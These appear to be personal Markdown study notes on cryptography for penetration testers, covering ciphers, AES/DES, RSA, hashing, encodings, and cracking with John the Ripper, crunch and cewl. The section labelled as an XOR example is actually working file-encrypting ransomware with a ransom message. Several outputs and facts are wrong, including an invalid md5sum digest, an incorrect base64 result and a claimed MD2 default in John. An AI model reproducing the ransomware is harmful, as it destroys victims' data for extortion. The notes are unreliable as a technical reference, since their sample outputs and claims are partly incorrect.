# What is Cryptography?

Crypto => Hidden/Secret | Graphy => Writing
### ● It has two main Components: 
- a. **Encryption** 
	- i. Practice of hiding messages so that they can not be read by anyone other than the intended recipient(confidentiality) 
- b. **Integrity** 
	- i. Ensuring that users of data/resources are not been altered

## Encryption

- **Cipher** is a method for encrypting messages
- The key which is an input to the algorithm is secret. 
-  Key: is a string of numbers or characters secret 
- If same key is used for encryption & decryption the algorithm is called **symmetric** 
- If different keys are used for encryption & decryption the algorithm is called **asymmetric**
- planetext -> ciphertext = **encryption**
- ciphertext -> planetext = **decryption**

### Symmetric Algorithms

Algorithms in which the key for encryption and decryption are the same are **Symmetric** 
-  Example: Caesar Cipher, AES, DES
-  **Types**: 
	- ○ Block Ciphers 
		- ■ Encrypt data one block at a time (typically 64 bits, or 128 bits) 
		- ■ Used for a single message
```
					   block1    block2
			hello -> |001001110|110101001| -> key -> 4H$D2
```
			 
- ○ Stream Ciphers  
	-  ■ Encrypt data one bit or one byte at a time 
	-  ■ Used if data is a constant stream of information
```
	hello -> |0|0|1|0|0|1|1|1|0|1|1|0|1|0|.. -> key -> 4H$D
```

## Substitution Ciphers
- Caesar Cipher is a method in which each letter in the alphabet is rotated by three letters as shown
```
		A B C D E F... Planetext
		| | | | | | 
		D E F G H I... Ciphertext
key(3)
```


### Substitution Cipher 
### Using a key to shift alphabet

● We have to ensure that the mapping is one-to-one 
- ○ no single letter in plain text can map to two different letters in cipher text 
- ○ no single letter in cipher text can map to two different letters in plain text
```
key = HEY 
A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
H E Y A B C D F G I J K L M N O P Q R S T U V W X Z

eg.
	message => cipher => encrypted
	  BYE       HEY        EXB

```


# ROT(rotation)

**ROT13** is a simple letter substitution cipher that replaces a letter with the 13th letter after it in the Latin alphabet. ( www.rot13.com )
- ROT13 is a special case of the Caesar cipher which was developed in ancient Rome, used by Julius Caesar in the 1st century BC.


# Data Encryption Standard / DES

- A symmetric key encryption algorithm that was once the predominant method for encrypting data.
- Developed by IBM in the early 1970s and adopted as a federal standard by the U.S. National Institute of Standards and Technology (NIST) in 1977, DES played a significant role in the evolution of modern cryptography.
- **DES** is a **block cipher** that processes data in fixed-size **blocks of 64 bits**.
- DES **uses a 56-bit key for encryption**. 
	- ○ Although the key is technically blocks of 64 bits. 64 bits, **8 of those bits are used for parity** (error checking) and do not contribute to the security of the key.
- DES is **no longer considered secure** for protecting sensitive information and has been officially withdrawn as a standard by NIST. 
	- ○ Modern systems have transitioned to more secure algorithms like **AES**

## How DES Works

● DES operates by taking a 64-bit block of plaintext and encrypting it using the following steps: 
```
		- ○ Initial Permutation 
	    - ○ Feistel Rounds 
		- ○ Final Permutation 
```
- ● The decryption process follows the same steps in reverse, using the same key.

### Initial and Final Permutation
The initial and final permutations are straight Permutation boxes **(P-boxes**) that are inverses of each other.
- For example in the p-box, if the input is: 1, 2, 3, 4, 5
- the output might be 3,4,2,1,5.
- This means the values of 1,2,3,4,5 are being arranged in the order of 3,4,2,1,5


## Fiestel Round

- The Feistel structure splits the 64-bit block of plaintext into two equal halves: a left half (L) and a right half (R).

- The encryption process then consists of 16 rounds, where the two halves of the block are processed and swapped iteratively.
- Each round involves several key operations:
	- ○ Expansion
	- ○ Substitution
	- ○ Permutation
	- ○ XOR with a subkey
	- ○ Swapping halves


## Advanced Encryption Standard/AES

- a symmetric encryption algorithm that is widely used across the globe to secure sensitive data. 
- ● Developed by Belgian cryptographers Vincent Rijmen and Joan Daemen.
- EG.  For our banks
- ● AES was adopted as the encryption standard by the U.S. National Institute of Standards and Technology (NIST) in 2001, replacing the older Data Encryption Standard (DES).

- AES operates on **Block Cipher** which means data in fixed-size blocks , specifically **128-bit** blocks.
	- AES performs operations on bytes of data rather than in bits. 
	-  Since the block size is 128 bits, the cipher processes 128 bits (or 16 bytes) of the input data at a time.
	- 
- **AES supports three different key lengths, providing varying levels of security:**
	- ○ AES-128: Uses a 128-bit key.
	- ○ AES-192: Uses a 192-bit key. 
	- ○ AES-256: Uses a 256-bit key.
- Longer keys provide stronger encryption but require more processing power.
- **AES-256 is considered highly secure** and is commonly used for top-level security applications.


### How AES Works

AES operates using a series of transformations that include substitution, permutation, and mixing of input data. The encryption process consists of several rounds, depending on the key size:
- AES-128: 10 rounds
- AES-192: 12 rounds 
- AES-256: 14 rounds
● **Each round involves a series of steps:**
- ○ **SubBytes**: A substitution step where bytes are replaced according to a predefined lookup table ( [[S-box]] )
- ○ **ShiftRows**: A permutation step where rows of the state are shifted cyclically. 
- ○ **MixColumns**: A matrix multiplication. Each column is multiplied with a specific matrix and thus the position of each byte in the column is changed as a result 
- ○ **AddRoundKey**: A step that adds the round key to the state using bitwise XOR. <br>
● The final round omits the MixColumns step, completing the encryption process. The decryption process follows the reverse of these steps to convert the ciphertext back into plaintext.


## Substitution Box / S-box

-  Each byte of the input is substituted for another byte according to a fixed table which strengthens the confusion and diffusion properties of the encryption.

## Shift Rows

This step is just as it sounds. Each row is shifted a particular number of times. 
- ○ The first row is not shifted 
- ○ The second row is shifted once to the left. 
- ○ The third row is shifted twice to the left. 
- ○ The fourth row is shifted Three Times to the left.
```
b0  |  b1  |  b2  | b3      ->    b0  | b1   |  b2   |  b3
b4  |  b5  |  b6  | b7      ->    b7  | b4   |  b5   |  b6
b8  |  b9  |  b10 | b11     ->    b10 | b11  |  b8   |  b9
b12 |  b13 |  b14 | b15     ->    b15 | b12  |  b13  |  b14
```
- Mixing collumns with dt rounds. <br>
**NB**. This step is **encryption**, To reverse start from last.


## Applications of AES

- **Data Encryption**: to encrypt files, folders, and even entire disks in storage devices.
- **Secure Communications**: (e.g., WPA2/WPA3 for Wi-Fi security), and voice-over-IP (VoIP)
- **Cryptographic Protocols**: TLS (Transport Layer Security) and IPSec, rely on AES for their encryption needs.
- **Government and Military Use**: AES is approved by the U.S. government for encrypting classified information, and AES-256 is used for Top Secret data.


## Encryption / Decryption

Common Terms
- **SecretKey**: this is the 56-bit key 
- **IV(Initialization Vector)**: A random or pseudo random value used to ensure uniqueness in encryption.
- **Encryption Mode**:
	- **ECB** (Electronic Codebook): Each block of plaintext is encrypted independently.
	- **CBC** (Cipher Block Chaining): Each plaintext block is XORed with the previous ciphertext block before encryption.
	
## Limitation of Symmetric Encryption

- ● Any exposure to the secret key compromises confidentiality of ciphertext 
- ● A key needs to be delivered to the recipient of the coded message for it to be deciphered 
	- ○ Some intruders can get the key and BOOM! No secret anymore.

## Asymmetric Encryption

Uses a pair of keys for encryption 
- ○ Public key for encryption 
- ○ Private key for decryption <br>

- ○ Secret transmission of key for decryption is not required 
	- ■ Public key can be exposed so, if i need to send you a message i just ask you for your public key and i will encrypt the message with your public key. When you get the ciphertext you can decrypt it with your private key.
- Every entity can generate a key pair(private&public) and release its public key


## Types of asymmetric enc.

- Two most popular algorithms are RSA & El Gamal
- ● **RSA** 
	- ○ Developed by Ron Rivest, Adi Shamir, Len Adelman 
	- ○ Both public and private key are interchangable 
	- ○ Variable Key Size (512, 1024, or 2048 bits) 
	- ○ Most popular public key algorithm 
	- ○ It have a maths formulas for generating the keys.
- ● **El Gamal**
	- ○ Developed by Taher ElGamal 
	- ○ Variable key size (512 or 1024 bits) 
	- ○ Less common than RSA


## Applications

One of example program that use asymmetric encryption is SSH.
- When you Create/Config SSH on your computer it give you 2 keys, 1 **public** and 1 **private**, so 
- **when connection is established** each hosts exchange their public key and store it in (**known_hosts**), then anytime they send data they will encrypt them with the public, and the host will decrypt it with its private key.
- To Create the keys: **ssh-keygen** <br>
- So if your Private Key got leaked�  
```
		cat .ssh/id_rsa

		cat .ssh/known_hosts
		cat .ssh/id_rsa.pub
```


# 3 Terms of Cryptography

1) **Encoding/ decoding** 
	- ○ This is a method of creating Ciphertext without using any key 
	- ○ This can be done by doing math on the given input/substitution 
		- ■ Examples: base64,base32,rot… 
2) **Encrypting/Decrypting** 
	- ○ This is method of creating Cipher text with keys. 
	- ○ To decrypts this kind u need to have the private key 
		- ■ Example: DES,AES,RSA
3) **Hash Function** 
	- ○ Hashing algorithm is a one-way cryptographic function that accepts a message of any length as input and returns as output a fixed-length digest value 
	- ○ This means that a calculated hash cannot be reversed using just the output given. This ties back to a fundamental mathematical problem known as the [[P vs NP relationship]] .
	- Hash is A random Hexadecimal combination.
	- To reverse the hash, you just **search for some match**, you don't decrypt/decode it.
	- **Salt**: is a random string used for data modification for password protection, This can be adding some text as prefix/suffix
		- ■ Example of Hashes: MD5, SHA256, bcrypt...


## MD5 ( message-digest algorithm )

- ● The MD5 designed to convert a message into a 128-bit hash value.
- ● Each MD5 hash looks like 32 numbers and letters, but each digit is in hexadecimal and represents four bits.
- ● The MD5 hash function was originally designed for use as a secure cryptographic hash algorithm for authenticating digital signatures.
	- ○ But MD5 has been deprecated for uses other than as a noncryptographic checksum to verify data integrity and detect unintentional data corruption.


# Purpose of hashing

- Hashes are used for **Confidentiality** and **Integrity**.
```
>	echo 1, 2, 3, 4, 5 > top_secret.txt
>	md5sum top_secret.txt
   c76ab33d2323f2321e123f32232b32233a        top_secret.txt
```
NB. you can look dt softwares hash when you download them.
- **Eg**. The software **sum/Hash** is sha256sum so download the software and check the hash, if the hash changed, you missed something so download again.
```
		sha256sum <SW_name>
```


# Kinds of encodings/encryptions

- ● **Base2** 01100010 01110010 01100101 01100001 01101011 01101001 01110100 
- ● **Base8** 142 162 145 141 153 151 164 
- ● **Base16** 62 72 65 61 6b 69 74 
- ● **Base32** MJZGKYLLNF2A==== 
- ● **Base58** 4jP4KDubX1 
- ● **Base62** 22udqyscMu 
- ● **Base64** YnJlYWtpdA== 
- ● **Base85** @WH$gCM@k 
- ● **Base91** %zmfv;:YH 
- ● **URL encode**: hello%20there%20%3F 
- ● **Md5**: 5d41402abc4b2a76b9719d911017c592 
- ● **Sha1**: aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d 
- ● **Rot** : Uryyb, Frphevgl Grfgref => look for some random word that looks rotated


# Tools of the trade

● There are lots of encodings/encryption Algorithms ● To identify these we need to understand every Algorithm Properties, But that is not easy for humans so we will use some automation tools/sites.
- ● **Tools**: 
	- ○ **hashid** 
		- ■` hashid <hash>`
	- ○ **Cyber chef** (web) 
	- ○ **Tunnelsup** (web)

## Tunnels Up

- THis will help You analyze and determine what that hash is based on the bit length and the base.
- tunnelsup.com/hash-analyzer/

## CyberChef

- ● Goto google and type cyberchef 
- ● Click on the 1st link.
- https://gchq.github.io/CyberChef/
- ● Search for magic 
- ● Drag and drop it, to the recipe.
- ● Add your text to the input 
- ● Look at the output it is the guess of what the hash can be


# decoding/decrypting

- There are so, many way to reverse some hashes/ciphers.
	- ● **Hashes** 
		- ○ www.Craskstation.net (**non-salted**) 
		- ○ Own cracking (google the name) eg, `md5 decrypter`
	- ● **Encodings** 
		- ○ CyberChef

- Searching the hash on search engines is Good way to get the match value.


## Cyber chef

- By searching any encryption you can decode/decrypt it.
	- ● We use **from** to **decrypt** 
	- ● We use **to**  to **encrypt**
	- eg. `from base64`


## Base64 with Terminal

```
>	echo "Hello There" | base64 
    SGVMSVMgfsh1nsgKSHJKhG
>	echo "SGVMSVMgfsh1nsgKSHJKhG" | base64 -d
    Hello There
```

# DES encrypt

LINK: https://anycript.com/crypto/des


# AES encrypt

LINK: https://anycript.com/crypto


# Identifying Unknown Hashes

➔ Sometimes when you do penetration tests you will get some Hash. these hashes are not normal hashes they are generated by some Platform/Software. So to Crack this hash.
- ◆ Identify the Software which the hash Generated with. 
	- ● Ex: The Hash can be generated by some Software called **Openfire**
- ◆ Then Try to Search Some Cracking Scripts made for this hash. (" **openfire hash crack** "  on google).


# Wordlists

- Wordlists are a normal text file that contains Different Words that can be used to match hashes, or for checking some parameters repeatedly using some loops.
- `usr/share/..`  check here
- look some: 
```
		head -n 30 rockyou.txt
		head -n 30 seclists/Discovery/web-content/common.txt
```


# Custom Wordlists

We can Create our own Wordlists, We can Create text file and add our highly usable words or we can use tools like 
- Cewl 
- Cupp
- [[crunch]] <br>
```
>   cewl http://vulnweb.com -d 3
>   crunch 4 6 123456 - o wordlist.txt
```


## Cewl Tool

**Cewl** is a Ruby program that crawls a URL to a defined depth, optionally following external links, and produces a list of keywords that password crackers
```
>	cewl https://geezsecurity.com
>	cewl https://geezsecurity.com -m 7
>	cewl https://geezsecurity.com --with-numbers
```


## Crunch

**Crunch** is a popular open-source tool used for creating custom wordlists or dictionaries for password cracking, network security testing, or other security-related purposes.
- Syntax: `crunch <min_length> <max_length> [options]`
- ● **Options**:
	- **`-t`**: character set `‘,natan^%%%’`
		- ■ , for all uppercase letters 
		- ■ @ for all lowercase letters 
		- ■ % for all numeric characters 
		- ■ ^ for all special characters
- **`-p`**: permutation
- **eg**:
```
		crunch 4 6 abcd -o test
```
##### With Characterset
```
>	crunch 9 9 -t rexder^%% -o test
```
- ● The Character set and the length you put have to be equal 
- ● The maximum and minimum length should be the same size as the pattern you specified.


# John the Ripper

**John the Ripper**: is one of the most well known, well-loved and versatile hash cracking tools out there
- It combines a fast cracking speed, with an extraordinary range of compatible hash types. 
	- ● **Syntax**: `john [options] [path to file]`
	- ● ● **Options**:
		- `--wordlist=<path>` : to specify wordlist
			- ■`--wordlist=/opt/rockyou.txt`
		- `--format=`: to specify the hashtype if you know, else it will guess
		- If you dont use --format, john will use md2 by default.
			- ■– format=raw-md5
				- ● https://medium.com/@1200km/john-the-ripper-hash-formats-f2ec958acaf8
- **EG**.
```
>	cat hash.txt 
	ff3f2d22e5abc544c33ff2e99c
>	john --wordlist=/opt/rockyou.txt hash.txt --format=raw-md5
	......after minutes, here you will get the original password...
```


# Python for cryptography

We can use programming to do tools that can do our own encryption and encoding hash type
- There are so many methods, even you can do the encoding/decodeing for the base64…
- You just need to **understand the maths**.
- Now i will show u simple XOR’ing example 
	- ○ What is XOR?

### pseudocode 
```
	1. encode function
	2. string in number(ord) ^ key
	3. result to hex(hex)
	4. stared to variable called encrypt_hex
	5. Displayed
```
```
1. decode function
2. hex to unicode and stored on variable called hex2uni
3. hex2uni in number(ord) ^ key
4. change the result to alphabetic character
5. stored to variable called decrypt_text
6. Displayed
```

- XORing encryption and decryption with python:
```
#XORing encryption

import os
from cryptography.fernet import Fernet
files = []
key = Fernet.generate_key()
with open('masterkey.key', "xb") as mykey:
        mykey.write(key)
for file in os.listdir():
        if file != 'masterkey.key' and file != "encrypt_ransom.py" and os.path.isfile(file):
                files.append(file)
for fl in files:
        with open(fl, 'rb') as contents:
                a = contents.read()
        encrypt = Fernet(key).encrypt(a)
        with open(fl, "wb") as realfiles:
                realfiles.write(encrypt)
print("Your Files are encrypted. so pay with @solace!")
```

```
#XORing decryption

import os
from cryptography.fernet import Fernet
files = []
with open("masterkey.key", 'rb') as mykey:
        key = mykey.read()
for file in os.listdir():
        if file != "decrypt_ransom.py" and file != "masterkey.key" and os.path.isfile(file):
                files.append(file)
for fl in files:
        with open(fl, 'rb') as contents:
                a = contents.read()
        decrypt = Fernet(key).decrypt(a)
        with open(fl, 'wb') as realfile:
                realfile.write(decrypt)
print("Your files are decrypted! Thanks for paying!")
```


# Base64 decode/encode
```
import base64
msg = input("text: ")
encoded=base64.b64encode(bytes(msg, 'utf-8'))
print(encoded)

decoded=base64.b64decode(encoded)
print(decoded)
```


# Obfuscation

- ● In software development, obfuscation is the act of creating source or machine code that is difficult for humans or computers to understand. 
- ● As we know High level programming lang. are easy to understand, so if hackers got your code he can read it, but to make it more difficult we use this technique 
- ● Developers Use this to Keep the confidentiality of codes, That makes it Hard to hackers to simply read the code and understand the flow. 
- For **python** code: https://pyobfuscate.com/pyd
- Softwares Used to make Obfuscation on websites: **WebPack**
- Obfuscate Android Code Software: **ProGuard**
- Codes can be problem!! so Obfuscation is best way.
- **NB**. If you want obfuscation tool for any language, search on google. 
	- eg. "javascript obfuscator"
<br>

#### PRACTICE PRACTICE PRACTICE!!!
